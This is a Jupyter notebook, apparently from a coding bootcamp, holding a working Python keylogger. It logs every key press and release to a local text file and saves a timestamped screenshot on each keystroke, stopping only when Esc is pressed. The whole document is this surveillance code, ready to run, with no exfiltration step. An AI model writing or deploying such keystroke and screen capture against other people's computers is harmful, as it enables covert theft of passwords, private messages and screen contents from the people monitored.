{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Key Logger\n",
    "\n",
    "import os\n",
    "import autopy\n",
    "import time\n",
    "from pynput import keyboard\n",
    "\n",
    "\n",
    "def on_press(key):    \n",
    "    with open(\"C:\\\\Users\\\\Ashutosh\\\\Desktop\\\\LCO Winter Bootcamp\\\\day14\\\\log\\\\KeyLoggerInfo.txt\",'a') as f:\n",
    "        try: \n",
    "            f.write('alphanumeric key {0} pressed'.format(key.char))\n",
    "            f.write(\"\\n\")\n",
    "           \n",
    "            \n",
    "        except AttributeError:\n",
    "            f.write('special key {} pressed'.format(key))\n",
    "            f.write(\"\\n\")\n",
    "              \n",
    "    #screen capture on each keystroke\n",
    "    s = time.asctime(time.localtime(time.time())).split()\n",
    "    date_time = '_'.join(x for x in s )\n",
    "    date_time = date_time.replace(':','_')\n",
    "    img = autopy.bitmap.capture_screen()\n",
    "    SAVE_PATH = \"C:\\\\Users\\\\Ashutosh\\\\Desktop\\\\LCO Winter Bootcamp\\\\day14\\\\log\\\\Screenshots\"\n",
    "    LOGFILE_NAME = \"%s.png\" % date_time\n",
    "    LOGFILE_PATH = os.path.join(SAVE_PATH,LOGFILE_NAME)\n",
    "    img.save(LOGFILE_PATH)    \n",
    "    \n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    with open(\"C:\\\\Users\\\\Ashutosh\\\\Desktop\\\\LCO Winter Bootcamp\\\\day14\\\\log\\\\KeyLoggerInfo.txt\",'a') as f:\n",
    "        f.write('{0} released'.format(key))\n",
    "        f.write(\"\\n\")\n",
    "    \n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Collect events until released\n",
    "with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# ...or, in a non-blocking fashion:\n",
    "listener = keyboard.Listener(on_press=on_press,on_release=on_release)\n",
    "listener.start()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
